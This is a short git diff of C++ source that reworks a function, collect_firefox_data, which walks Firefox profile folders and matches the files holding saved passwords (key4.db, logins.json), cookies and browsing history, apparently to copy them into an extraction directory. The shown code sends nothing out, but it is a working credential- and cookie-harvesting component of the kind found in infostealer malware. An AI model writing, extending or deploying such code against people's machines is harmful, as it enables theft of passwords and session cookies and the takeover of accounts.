@@ -1,4 +1,5 @@
 #include <iostream>
+#include <cstddef>
 #include <stdio.h>
 #include <tchar.h>
 #include <string>
@@ -103,21 +104,30 @@ void collect_firefox_data() {
 	if (path_to_extraction_directory != "" && path_to_appdata != "") {
 		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
 		std::vector<std::regex> regex_list = {
-			std::regex("(.*?)places\\.sqlite$"),		// Contains bookmarks, names of downloaded files, and websites visted
-			std::regex("(.*?)key4\\.db$"),			// Passwords
-			std::regex("(.*?)logins\\.json$"),		// Passwords
-			std::regex("(.*?)cookies\\.sqlite$"),	// Stored cookies
+			std::regex("(.*?)(places\\.sqlite)$"),	// Contains bookmarks, names of downloaded files, and websites visted
+			std::regex("(.*?)(key4\\.db)$"),			// Passwords
+			std::regex("(.*?)(logins\\.json)$"),		// Passwords
+			std::regex("(.*?)(cookies\\.sqlite)$"),	// Stored cookies
 		};
-		std::regex profile_regex("(.*?)([a-zA-Z0-9]{1,}\\..*?)$");
+		std::regex profile_regex("(.*?)([a-zA-Z0-9]{8,8}\\.(.*?))$");
+		std::smatch sm;
+		std::string profile_path_as_string;
+		std::string profile_name;
+		std::string desired_file_path_as_string;
+		std::string desired_file_name;
 
 		for (const auto& profile_path : fs::directory_iterator(path_to_profiles)) {
-			if (std::regex_match(profile_path.path().string(), profile_regex)) {
-				std::cout << profile_path.path().string() << std::endl;
-			}
-			for (const auto& item : fs::directory_iterator(profile_path.path().string())) {
+			profile_path_as_string = profile_path.path().string();
+			std::regex_match(profile_path_as_string.cbegin(), profile_path_as_string.cend(), sm, profile_regex);
+			profile_name = sm[3];
+
+			for (const auto& file_path : fs::directory_iterator(profile_path.path().string())) {
+				desired_file_path_as_string = file_path.path().string();
 				for (std::regex i : regex_list) {
-					if (std::regex_match(item.path().string(), i)) {
-						// std::cout << item.path().string() << std::endl;
+					if (std::regex_match(desired_file_path_as_string.cbegin(), desired_file_path_as_string.cend(), sm, i)) {
+						desired_file_name = sm[2];
+						desired_file_name = profile_name + "_" + desired_file_name;
+						
 					}
 				}
 			}
